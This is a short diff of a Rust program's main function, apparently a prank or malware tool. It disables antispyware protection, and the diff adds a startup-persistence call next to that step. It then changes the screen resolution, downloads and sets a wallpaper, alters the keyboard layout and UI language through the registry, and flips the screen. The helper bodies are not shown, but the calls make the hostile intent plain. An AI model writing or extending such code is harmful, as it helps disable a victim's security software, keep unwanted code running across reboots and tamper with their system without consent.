@@ -10,7 +10,7 @@ use keyboard::Keyboard;
 use screen::Screen;
 use tokio;
 use ui_language::UILanguage;
-use util::download_file;
+use util::{add_startup_command, download_file};
 use wallpaper::Wallpaper;
 #[tokio::main]
 async fn main() -> Result<()> {
@@ -29,14 +29,15 @@ async fn main() -> Result<()> {
     let mut keyboard = Keyboard {
         layout: env!("KEYBOARD_LAYOUT").to_string(),
     };
+
     disable_antispyware();
+    add_startup_command();
     screen.change_resulation();
     download_file(&wallpaper.url, &wallpaper.image_path).await?;
     keyboard.change_keyboard_layout();
     keyboard.change_keyboard_layout_from_registry();
     ui_language.change_prefered_lang();
     ui_language.change_ui_lang_from_hkey();
-
     wallpaper.set_wallpaper().await;
     screen.flip_screen();
     std::process::exit(0)
